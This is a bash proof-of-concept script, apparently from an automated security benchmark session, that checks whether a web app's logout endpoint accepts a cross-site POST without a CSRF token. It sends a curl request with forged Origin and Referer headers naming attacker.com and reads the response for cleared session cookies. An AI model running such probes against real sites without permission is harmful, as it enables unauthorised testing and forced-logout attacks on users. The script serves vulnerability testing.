#!/bin/bash
# POC: Simplified CSRF logout POC demonstrating missing token validation
# Target: ./repo
# Created: 2025-11-04T17:44:35.625Z
# Session: benchmark-XBEN-027-24-mhku5fyk

# CSRF Logout Attack POC - Version 3
# Simplified version demonstrating logout endpoint vulnerability

TARGET_URL="${1:-http://localhost:8080}"

echo "=== CSRF Logout Endpoint Vulnerability POC ==="
echo ""

# Step 1: Attempt logout with a dummy session cookie (CSRF attack simulation)
# This demonstrates the endpoint accepts POST requests without CSRF token validation
echo "[*] Step 1: Sending CSRF logout request from cross-site origin..."
echo "    Endpoint: POST /logout"
echo "    Method: Cross-origin POST"
echo "    CSRF Token: NOT INCLUDED (simulating CSRF attack)"
echo ""

# Create a test session value
TEST_SESSION="test_session_value"

CSRF_RESPONSE=$(curl -s -i -b "session=$TEST_SESSION" \
  -X POST "$TARGET_URL/logout" \
  -H "Referer: http://attacker.com/malicious" \
  -H "Origin: http://attacker.com" \
  -H "Content-Type: application/x-www-form-urlencoded")

echo "[*] Full Response:"
echo "$CSRF_RESPONSE"
echo ""

# Check response for vulnerability indicators
echo "[*] Step 2: Analyzing response for CSRF protection..."
echo ""

if echo "$CSRF_RESPONSE" | grep -i "Set-Cookie.*session=" | grep -q "Expires\|Max-Age"; then
    echo "[+] CSRF VULNERABILITY CONFIRMED!"
    echo "[+] Session cookie was set (either cleared or modified)"
    
    if echo "$CSRF_RESPONSE" | grep -i "Set-Cookie" | grep -q "Max-Age=0\|Expires.*1970"; then
        echo "[+] Cookie appears to be cleared (Max-Age=0 or Expires in past)"
        echo "[+] Logout endpoint accepted the cross-site POST request"
        echo "[+] No CSRF token validation occurred"
        echo "[+] No 403 Forbidden error returned"
        echo ""
        echo "[+] VULNERABILITY: Logout endpoint is vulnerable to CSRF attacks"
        exit 0
    fi
    
    # Check for redirect (common logout behavior)
    if echo "$CSRF_RESPONSE" | grep -q "HTTP/1.1 302\|Location:"; then
        echo "[+] Endpoint returned HTTP 302 redirect (logout accepted)"
        echo "[+] No CSRF protection mechanism detected"
        exit 0
    fi
    
elif echo "$CSRF_RESPONSE" | grep -i "HTTP.*403" >/dev/null; then
    echo "[-] Endpoint returned 403 Forbidden - CSRF protection may be present"
    exit 1
    
elif echo "$CSRF_RESPONSE" | grep -i "HTTP.*401\|HTTP.*302" >/dev/null; then
    echo "[*] Endpoint returned redirect or auth error"
    echo "[*] Checking if session was modified..."
    
    if echo "$CSRF_RESPONSE" | grep -i "Set-Cookie" >/dev/null; then
        echo "[+] Session cookie was modified/cleared"
        echo "[+] Logout endpoint processed the request (no CSRF token required)"
        exit 0
    fi
else
    echo "[!] Unexpected response:"
    echo "$CSRF_RESPONSE" | head -20
fi

echo ""
echo "[*] Note: If endpoint responded with redirect (302), check 'Location' header"
echo "[*] If cookie was cleared, endpoint accepted CSRF logout request"